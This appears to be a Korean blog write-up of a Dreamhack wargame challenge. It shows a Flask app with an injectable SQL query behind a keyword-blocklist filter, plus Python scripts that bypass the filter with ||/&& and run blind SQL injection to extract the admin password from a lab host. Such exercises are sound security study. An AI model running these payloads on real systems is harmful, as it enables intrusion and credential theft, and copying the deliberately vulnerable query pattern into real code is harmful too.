---
title: "[2025-07-25] phpMyRedis"
excerpt: "Bypass WAF"

categories:
  - Problem
tags:
  - [Bypass WAF]

permalink: /Problem/[2025-07-25] phpMyRedis/

toc: true
toc_sticky: true

date: 2025-07-25
last_modified_at: 2025-07-25
---

## 🦥 본문

```python
import os
from flask import Flask, request
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'users')
mysql = MySQL(app)

template ='''
<pre style="font-size:200%">SELECT * FROM user WHERE uid='{uid}';</pre><hr/>
<pre>{result}</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
'''

keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/', 
            '\n', '\r', '\t', '\x0b', '\x0c', '-', '+']
def check_WAF(data):
    for keyword in keywords:
        if keyword in data.lower():
            return True

    return False

@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        if check_WAF(uid):
            return 'your request has been blocked by WAF.'
        cur = mysql.connection.cursor()
        cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
        result = cur.fetchone()
        if result:
            return template.format(uid=uid, result=result[1])
        else:
            return template.format(uid=uid, result='')

    else:
        return template

if __name__ == '__main__':
    app.run(host='0.0.0.0')

```

이전에 했던 문제와 비슷하지만 필터링이 추가되고 대소문자 혼용도 필터링이 추가됐다.

하지만 ||나 &&같은 방식으로 연산자 필터링은 없다

혹시 몰라서 이전 정답에서 사용했던 코드를 모두 아스키 코드로 바꿨다.

```sql
'%75%6E%69%6F%6E%09%73%65%6C%65%63%74%09null,upw,null%09%66%72%6F%6D%09user%09where%09uid=\"%61%64%6D%69%6E\"%23
```

에러가 나왔다 

### 풀이

1. 연산자 || 와 &&을 통해 연산자 우회를 한다.
2. length() 메소드를 통해 upw의 길이를 구한다.
    
    ```sql
    import requests
    
    url = "http://host8.dreamhack.games:16356/"
    
    for length in range(1, 100):  # 길이 1~99까지 시도
        payload = f"'||uid=reverse('nimda')&&char_length(upw)={length}#"
        params = {"uid": payload}
        response = requests.get(url, params=params)
        
        if "admin" in response.text:
            print(f"[+] Password length is {length}")
            break
    ```
    
    위의 결과를 통해 length가 44임을 알았다.
    
3. 길이를 구한 것을 바탕으로 substring()을 통해 Blind SQLi를 한다
    
    ```sql
    import requests
    import string
    
    url = "http://host8.dreamhack.games:16356/"
    charset = string.ascii_letters + string.digits  # 알파벳 + 숫자
    password = ""
    
    for i in range(1, 45):  # upw 길이가 44니까 1~44까지
        for ch in charset:
            payload = f"'||uid=reverse('nimda')&&substring(upw,{i},1)='{ch}'#"
            params = {"uid": payload}
            response = requests.get(url, params=params)
            
            if "admin" in response.text:
                password += ch
                print(f"[+] Found character {i}: {ch} → {password}")
                break
    ```